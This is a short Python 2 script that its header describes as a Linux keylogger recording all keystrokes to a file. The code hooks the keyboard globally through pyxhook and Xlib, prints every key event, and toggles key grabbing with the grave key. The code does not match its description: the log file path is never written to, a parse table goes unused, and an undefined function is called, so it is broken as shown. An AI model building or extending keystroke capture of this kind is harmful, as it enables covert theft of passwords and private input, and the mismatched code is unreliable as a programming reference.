"""
Copyright (c) 2015, Aman Deep
All rights reserved.


A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when grave key(`) is pressed

grave key is found below Esc key
"""


from Xlib import display
import Xlib
from Xlib import X
import Xlib.XK
import sys
import signal 
import time

import pyxhook

dpy = None
root = None
hook = None
stop = False
grabbed = False
timer = None
t_reset = True

#change this to your log file's path
log_file='/home/matt/Desktop/file.log'

to_grab = ["1", "m", "k", "l", "i", "o", "p"]

buf_parse = {"mm": "a",
             "mk": "b",
             "ml": "c",
             "mi": "d",
             "mo": "e",
             "mp": "f"}

def arm(sec = 10):
    signal.signal(signal.SIGALRM, lambda a,b:setstop())
    signal.alarm(sec)

def setstop():
    global stop
    stop = True

def kill():
    global stop
    stop = True
    print "killing hook"
    hook.cancel()
    sys.exit(1)



def get_code(key):
    keysym = Xlib.XK.string_to_keysym(key)
    keycode = dpy.keysym_to_keycode(keysym)
    return keycode

def grab_handler():
    if grabbed:
        for ch in to_grab:
            code = get_code(ch)
            print "  Grabbing " + ch + " - " + str(code)
            root.grab_key(code, X.AnyModifier, True, X.GrabModeSync, X.GrabModeSync)
    else:
        for ch in to_grab:
            print "  Ungrabbing " + ch
            code = get_code(ch)
            root.ungrab_key(code, X.AnyModifier)


def OnKeyPress(event):
    print "[", event.Key, "down]"
    if event.Ascii==96:
        global timer, t_reset
        if t_reset:
            global grabbed
            grabbed = not grabbed
            timer = time.time()
            t_reset = False
            grab_handler()
    elif grabbed and event.Key in to_grab:
        print "Reserved!"

def OnKeyUp(event):
    print "[", event.Key, "up]"
    if event.Ascii==96:
        global t_reset
        dif = time.time() - timer
        t_reset = True
        print "\t" + str(dif)
        if dif > 0.2:
            kill()



def main():
    global dpy, root, hook
    #instantiate HookManager class
    hook=pyxhook.HookManager()
    arm()
    #listen to all keystrokes
    hook.KeyDown=OnKeyPress
    hook.KeyUp=OnKeyUp
    #hook the keyboard
    hook.HookKeyboard()
    #start the session
    print "Hooking for `"
    hook.start()
    dpy = hook.record_dpy #display.Display()
    root = dpy.screen().root
    # we tell the X server we want to catch keyPress event
    root.change_attributes(event_mask = X.KeyPressMask|X.KeyReleaseMask)
    while True:
        if stop: kill()
        # time.sleep(1)
        event = dpy.next_event()
        print "event"
        handle_event(event)
        dpy.allow_events(X.AsyncKeyboard, X.CurrentTime)
"""
root = new_hook.record_dpy.screen().root

# just grab the "1"-key for now
root.grab_key(10, 0, True,X.GrabModeSync, X.GrabModeSync)


"""


if __name__ == '__main__':
    main()
